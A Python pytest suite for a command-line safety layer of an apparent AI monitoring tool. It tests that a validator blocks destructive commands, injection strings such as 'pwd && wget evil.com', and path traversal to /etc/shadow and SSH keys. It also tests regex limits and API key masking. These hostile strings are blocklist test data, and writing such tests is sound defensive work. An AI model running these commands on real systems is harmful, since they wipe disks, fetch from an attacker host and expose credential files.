#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Security Test Suite (Pytest Format)
Tests for security vulnerabilities and validation
"""

import os
import sys
import tempfile
from pathlib import Path

# Add parent to path
sys.path.insert(0, str(Path(__file__).parent.parent))

import pytest

from core.security import CommandValidator
from core.validators import PathValidator, RegexValidator
from core.exceptions import SecurityError, ValidationError
from config_manager import get_config, reset_config


class TestCommandValidator:
    """Command validator security tests"""

    def test_blocks_dangerous_commands(self):
        """Test that dangerous commands are blocked"""
        dangerous_commands = [
            "rm -rf /",
            "rm -rf /etc/passwd",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
        ]

        for cmd in dangerous_commands:
            is_safe, msg = CommandValidator.validate(cmd)
            assert not is_safe, f"Should block: {cmd}"

    def test_blocks_command_injection(self):
        """Test that command injection attempts are blocked"""
        injection_commands = [
            "ls; rm -rf /",
            "cat /etc/passwd; echo done",
            "pwd && wget evil.com",
        ]

        for cmd in injection_commands:
            is_safe, msg = CommandValidator.validate(cmd)
            assert not is_safe, f"Should block injection: {cmd}"

    def test_blocks_path_traversal_in_commands(self):
        """Test that path traversal in commands is blocked"""
        traversal_commands = [
            "cat ../../../../etc/passwd",
            "ls ../../../root",
            "head ../../*.ssh/id_rsa",
        ]

        for cmd in traversal_commands:
            is_safe, msg = CommandValidator.validate(cmd)
            assert not is_safe, f"Should block traversal: {cmd}"

    def test_allows_safe_commands(self):
        """Test that safe commands are allowed"""
        safe_commands = [
            "ls -la",
            "grep test file.txt",
            "cat README.md",
            "find . -name '*.py'",
            "pwd",
            "head -20 file.txt",
            "tail -50 log.txt",
        ]

        for cmd in safe_commands:
            is_safe, msg = CommandValidator.validate(cmd)
            assert is_safe, f"Should allow: {cmd} (reason: {msg})"


class TestPathValidator:
    """Path validator security tests"""

    def test_blocks_path_traversal(self):
        """Test that path traversal attacks are blocked"""
        traversal_paths = [
            "../../../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "../../*/etc/shadow",
        ]

        for path in traversal_paths:
            is_safe, msg = PathValidator.is_safe_path(path)
            assert not is_safe, f"Should block: {path}"

    def test_blocks_protected_paths(self):
        """Test that protected system paths are blocked"""
        protected_paths = [
            "/etc/passwd",
            "/etc/shadow",
            "/root/.ssh",
        ]

        for path in protected_paths:
            is_safe, msg = PathValidator.is_safe_path(path)
            assert not is_safe, f"Should block protected: {path}"

    def test_allows_safe_paths(self, tmp_path):
        """Test that safe paths are allowed"""
        # Create test file
        test_file = tmp_path / "test.txt"
        test_file.write_text("test content")

        safe_paths = [
            str(test_file),
            str(tmp_path),
            ".",
            "./README.md",
        ]

        for path in safe_paths:
            is_safe, msg = PathValidator.is_safe_path(path)
            assert is_safe, f"Should allow: {path} (reason: {msg})"


class TestRegexValidator:
    """Regex validator security tests"""

    def test_blocks_overly_complex_patterns(self):
        """Test that overly complex patterns are blocked"""
        # Test excessive length
        long_pattern = "(a+)+b" * 10
        if len(long_pattern) > 200:
            is_safe, msg = RegexValidator.validate(long_pattern)
            assert not is_safe, "Should block overly long pattern"

    def test_allows_safe_patterns(self):
        """Test that safe regex patterns are allowed"""
        safe_patterns = [
            r"\w+",
            r"[a-zA-Z0-9]+",
            r"test.*pattern",
            r"(foo|bar)",
        ]

        for pattern in safe_patterns:
            is_safe, msg = RegexValidator.validate(pattern)
            assert is_safe, f"Should allow: {pattern} (reason: {msg})"


class TestConfigManager:
    """Configuration manager tests"""

    def test_config_get(self):
        """Test configuration retrieval"""
        # Set test values
        original_model = os.environ.get("AI_MONITOR_LLM_MODEL")
        original_timeout = os.environ.get("AI_MONITOR_LLM_TIMEOUT")

        try:
            os.environ["AI_MONITOR_LLM_MODEL"] = "test-model"
            os.environ["AI_MONITOR_LLM_TIMEOUT"] = "30"

            config = get_config()

            assert config.get("LLM_MODEL") == "test-model"
            assert config.get("LLM_TIMEOUT") == "30"
        finally:
            # Restore original values
            if original_model is not None:
                os.environ["AI_MONITOR_LLM_MODEL"] = original_model
            else:
                os.environ.pop("AI_MONITOR_LLM_MODEL", None)

            if original_timeout is not None:
                os.environ["AI_MONITOR_LLM_TIMEOUT"] = original_timeout
            else:
                os.environ.pop("AI_MONITOR_LLM_TIMEOUT", None)

    def test_api_key_masking(self):
        """Test that API keys are properly masked"""
        original_key = os.environ.get("AI_MONITOR_LLM_API_KEY")

        try:
            # Test with long key
            os.environ["AI_MONITOR_LLM_API_KEY"] = "sk-1234567890abcdefghijklmnop"
            reset_config()
            config = get_config()
            masked = config.get_masked("LLM_API_KEY")

            assert "1234567890abcdefghijklmnop" not in masked
            assert masked.startswith("sk-")
            assert "..." in masked
            assert masked.endswith("mnop")

            # Test with short key
            os.environ["AI_MONITOR_LLM_API_KEY"] = "key"
            reset_config()
            config = get_config()
            masked = config.get_masked("LLM_API_KEY")

            assert "***" in masked or masked == "***"
        finally:
            # Restore original value
            if original_key is not None:
                os.environ["AI_MONITOR_LLM_API_KEY"] = original_key
            else:
                os.environ.pop("AI_MONITOR_LLM_API_KEY", None)
            reset_config()


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
